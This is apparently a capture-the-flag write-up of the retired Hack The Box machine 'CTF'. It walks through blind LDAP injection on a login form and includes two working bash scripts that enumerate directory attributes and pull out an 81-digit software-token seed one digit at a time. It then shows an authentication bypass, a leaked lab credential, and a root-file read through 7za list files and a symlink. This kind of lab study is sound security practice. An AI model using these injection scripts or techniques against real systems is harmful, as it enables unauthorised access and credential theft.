## Background

CTF is a retired vulnerable VM from Hack The Box.

## Information Gathering

Letâ€™s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.122 --rate=1000

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-02-06 04:34:40 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]

Discovered open port 22/tcp on 10.10.10.122
```

`masscan` finds two open ports. I'll do one better with `nmap` scanning the discovered ports.

```
# nmap -n -v -Pn -p22,80 -A --reason 10.10.10.122 -oN nmap.txt

Bummer. Nothing unusual stands out. Let's check out the `http` service. Here's how it looks like.


{% include image.html image_alt="b702c930.png" image_src="/64bbf229-1cb0-4b7f-9a19-bc9825568cc8/b702c930.png" %}


There's some kind of **Fail2Ban** thing going on here I guess, so brute-force actions that result in HTTP response >= 400 is out of the question. :no_good:

### Blind LDAP Injection

It turns out that our next hint lies in the HTML comments of the login page.


{% include image.html image_alt="b4ea9535.png" image_src="/64bbf229-1cb0-4b7f-9a19-bc9825568cc8/b4ea9535.png" %}


Attribute and schema? Sure sounds a lot like Lightweight Directory Access Protocol (or LDAP). And, what's the deal with the token string with 81-digits?

A simple Google search reveals that a token string with 81-digits is a software token delivery method called Compressed Token Format (CTF) provisioning. What an apt name for a HTB box!

I explored the login page for a bit and here's what I observe.

_Wrong username_


{% include image.html image_alt="53cd18fe.png" image_src="/64bbf229-1cb0-4b7f-9a19-bc9825568cc8/53cd18fe.png" %}


_Right username_


{% include image.html image_alt="bd4e702c.png" image_src="/64bbf229-1cb0-4b7f-9a19-bc9825568cc8/bd4e702c.png" %}


You may notice that the login page checks for the username first and if it's correct, it then checks for the One-Time Pin (OTP). Normally, OTP comes in 4-digit, 6-digit and 8-digit formats.

You are probably thinking, "how the hell did he guess the username". I didn't. I used the asterisk (`*`) wildcard in LDAP search filter.

At first, I tried using a single asterisk. I didn't get any feedback. I took it up a notch and tried URL encoding the asterisk and again, received no feedback. Finally, I tried double URL encoding and guess what, it worked!

_Double URL encoding the asterisk_


{% include image.html image_alt="0ff66ec2.png" image_src="/64bbf229-1cb0-4b7f-9a19-bc9825568cc8/0ff66ec2.png" %}


_The wildcard does its magic!_


{% include image.html image_alt="e1e880c7.png" image_src="/64bbf229-1cb0-4b7f-9a19-bc9825568cc8/e1e880c7.png" %}


Armed with this insight and using a LDAP query such as `*)(cn=*`, I wrote a script to help me enumerate the valid attributes from the schema.

<div class="filename"><span>check.sh</span></div>

```bash
#!/bin/bash

HOST=10.10.10.122
LIST=$1

function urlencode() {
  echo -n "$1" \
  | xxd -p \
  | tr -d '\n' \
  | sed -r 's/(..)/%\1/g'
}

function send_payload() {
  local query="*)(XXX=*"
  local payload="${query/XXX/$1}"
  local payload="$(urlencode $payload)"
  local payload="$(urlencode $payload)"

  curl \
    -s \
    -d "inputUsername=$payload" \
    -d "inputOTP=123456" \
    http://$HOST/login.php \
  | sed -r -e '34!d' -e 's/\s+<\/div>$//' \
  | rev \
  | cut -d ' ' -f1-2 \
  | rev \
  | tr -d '\n'
}

for attr in $(cat $LIST); do
  result=$(send_payload $attr)
  if [ "$result" == "Cannot login" ]; then
    echo "[+] Found: $attr"
  fi
done
```

Running the script against a LDAP attributes wordlist I found [here](https://github.com/droope/ldap-brute/blob/master/wordlists/attribute_names), this is what I got.

```
[+] Found: cn
[+] Found: commonName
[+] Found: gidNumber
[+] Found: homeDirectory
[+] Found: loginShell
[+] Found: mail
[+] Found: name
[+] Found: objectClass
[+] Found: pager
[+] Found: shadowLastChange
[+] Found: shadowMax
[+] Found: shadowMin
[+] Found: shadowWarning
[+] Found: sn
[+] Found: surname
[+] Found: uid
[+] Found: uidNumber
[+] Found: userPassword
```

At first, I thought the token string is in the userPassword attribute. However, this attribute has a OctetString type which makes it an unlikely candidate. It turns out that `pager` is the attribute storing the token string. To that end, I re-purpose the previous script to exfiltrate the digits one by one until I have the full 81-digit token string.

<div class="filename"><span>deduction.sh</span></div>

```bash
#!/bin/bash

HOST=10.10.10.122
TOKEN=""

# urlencode
function urlencode() {
  echo -n "$1" \
  | xxd -p \
  | tr -d '\n' \
  | sed -r 's/(..)/%\1/g'
}

# send payload
function send_payload() {
  local query="*)(pager=XXX*"
  local payload="${query/XXX/$1}"
  local payload="$(urlencode $payload)"
  local payload="$(urlencode $payload)"

  curl \
    -s \
    -d "inputUsername=$payload" \
    -d "inputOTP=123456" \
    http://$HOST/login.php \
  | sed -r -e '34!d' -e 's/\s+<\/div>$//' \
  | rev \
  | cut -d ' ' -f1-2 \
  | rev
}

# main
PAYLOAD=""
TOKEN=""

for p in $(seq 1 81); do
  for d in {0..9}; do
    result=$(send_payload "$PAYLOAD${d}")
    if [ "$result" == "Cannot login" ]; then
      TOKEN=${TOKEN}${d}
      PAYLOAD=${PAYLOAD}${d}
      echo -n $d
      break
    fi
  done
done

echo -e "\n[+] Token string is: $TOKEN"
```


{% include image.html image_alt="0ab438a3.png" image_src="/64bbf229-1cb0-4b7f-9a19-bc9825568cc8/0ab438a3.png" %}


### Software Token

Now that we have the token string, we can import the token string into `stoken`. According to the manual, `stoken` is  a software token compatible with RSA SecurID 128-bit (AES) tokens. We can use it to generate the OTPs.


{% include image.html image_alt="f6d5e7f3.png" image_src="/64bbf229-1cb0-4b7f-9a19-bc9825568cc8/f6d5e7f3.png" %}


You can choose any password you like. I've chosen `hello` as my password.


{% include image.html image_alt="09c8657b.png" image_src="/64bbf229-1cb0-4b7f-9a19-bc9825568cc8/09c8657b.png" %}


Again, you are can choose any PIN you like. I've chosen `0000` as my PIN.


{% include image.html image_alt="ae6c1635.png" image_src="/64bbf229-1cb0-4b7f-9a19-bc9825568cc8/ae6c1635.png" %}


Once that's done, you'll see the software token, which gives it more of a token device feel, if you will. :laughing:


{% include image.html image_alt="e2f0c212.png" image_src="/64bbf229-1cb0-4b7f-9a19-bc9825568cc8/e2f0c212.png" %}


We can now proceed to login to the site. I'm using the following query to bypass authentication.


{% include image.html image_alt="776f960b.png" image_src="/64bbf229-1cb0-4b7f-9a19-bc9825568cc8/776f960b.png" %}


I sent in the login request with Burp's Repeater.


{% include image.html image_alt="8231a783.png" image_src="/64bbf229-1cb0-4b7f-9a19-bc9825568cc8/8231a783.png" %}


With that, my session should be authenticated and I can use my browser instead.


{% include image.html image_alt="a6511ade.png" image_src="/64bbf229-1cb0-4b7f-9a19-bc9825568cc8/a6511ade.png" %}


Boom. I'm now at a page which appears to execute commands. Too bad, I'm not privileged enough.


{% include image.html image_alt="effc5cbf.png" image_src="/64bbf229-1cb0-4b7f-9a19-bc9825568cc8/effc5cbf.png" %}


To bypass that, recall the valid attributes that I've enumerated previously? According to its description, `gidNumber` is _an integer uniquely identifying a group in an administrative domain_. With that in mind, we can try the following query.


{% include image.html image_alt="7b8a72dc.png" image_src="/64bbf229-1cb0-4b7f-9a19-bc9825568cc8/7b8a72dc.png" %}


Again, let's send the login request with Burp's Repeater.


{% include image.html image_alt="6d74ef1f.png" image_src="/64bbf229-1cb0-4b7f-9a19-bc9825568cc8/6d74ef1f.png" %}


We should be able to execute commands right from the browser.


{% include image.html image_alt="97b8e9e4.png" image_src="/64bbf229-1cb0-4b7f-9a19-bc9825568cc8/97b8e9e4.png" %}


Perfect. I'm very interested to look at the PHP code of `login.php` and `page.php` to see what's the LDAP filter. As an added bonus, guess what's in there? Credentials!


{% include image.html image_alt="b291cf9b.png" image_src="/64bbf229-1cb0-4b7f-9a19-bc9825568cc8/b291cf9b.png" %}


Armed with the credential (`ldapuser:e398e27d5c4ad45086fe431120932a01`), I can give myself a shell via SSH.

The `user.txt` is at `ldapuser`'s home directory.


{% include image.html image_alt="59b372c8.png" image_src="/64bbf229-1cb0-4b7f-9a19-bc9825568cc8/59b372c8.png" %}


## Privilege Escalation

During enumeration of `ldapuser`'s account, I notice a script at `/backup/honeypot.sh` that looks like this.

<div class="filename"><span>honeypot.sh</span></div>

```bash
# get banned ips from fail2ban jails and update banned.txt                                                                                                                                          [0/3]
# banned ips directily via firewalld permanet rules are **not** included in the list (they get kicked for only 10 seconds)                                                                              
/usr/sbin/ipset list | grep fail2ban -A 7 | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u > /var/www/html/banned.txt                                                               
# awk '$1=$1' ORS='<br>' /var/www/html/banned.txt > /var/www/html/testfile.tmp && mv /var/www/html/testfile.tmp /var/www/html/banned.txt                                                                

# some vars in order to be sure that backups are protected
now=$(date +"%s")
filename="backup.$now"
pass=$(openssl passwd -1 -salt 0xEA31 -in /root/root.txt | md5sum | awk '{print $1}')

# keep only last 10 backups
cd /backup
ls -1t *.zip | tail -n +11 | xargs rm -f

# get the files from the honeypot and backup 'em all
cd /var/www/html/uploads
7za a /backup/$filename.zip -t7z -snl -p$pass -- *

# cleaup the honeypot
rm -rf -- *

# comment the next line to get errors for debugging
truncate -s 0 /backup/error.log
```

I stared at it for a long time. I knew instinctively this is the key to privilege escalation but I can't figure who or what is writing to the file `error.log` that  got truncated at the last line. It was only until I ran `watch -n1 ls -lt` at `/backup`, did I notice that the script is backing up and removing files from `/var/www/html/uploads` (a.k.a the honeypot) and also updating the last-modified date of `error.log` at every minute.

If I had to guess, I would say that there's a `cron` job running as `root`, executing `/backup/honeypot.sh` and redirecting `stderr` to `/backup/error.log` at every minute on the minute.

&hellip;

Another interesting bit of information I gathered is that the so-called honeypot at `/var/www/html/uploads` is only writable by `apache`.


{% include image.html image_alt="5d071d1e.png" image_src="/64bbf229-1cb0-4b7f-9a19-bc9825568cc8/5d071d1e.png" %}


&hellip;

Armed with the information I gathered so far, I can start to work my way to read `/root/root.txt` by abusing `7za`. This versatile archiver supports the concept of a list file, i.e. a file containing a list of files, separated by newline.

For example, if the file `listfile.txt` contains the following:

```
/backup/*.zip
```

Then the command `7za a backup.zip -t7z @listfile.txt` adds all the files ending with `.zip` in `/backup` to `backup.7z`. And, if the command can't find the file in the list file, it spits out diagnostic messages, such as warnings and/or errors to `stderr`.

On one hand, if we run `tail -f /backup/error.log` in the shell, we can capture the diagnostic messages sent by `7za` before it gets truncated. On the other hand, we can trick `7za` to spit out diagnostic messages by creating the following file and creating a symbolic link to `/root/root.txt`.


{% include image.html image_alt="53549f63.png" image_src="/64bbf229-1cb0-4b7f-9a19-bc9825568cc8/53549f63.png" %}


One minute later, we should see the `root.txt` on the shell.


{% include image.html image_alt="2e241a15.png" image_src="/64bbf229-1cb0-4b7f-9a19-bc9825568cc8/2e241a15.png" %}
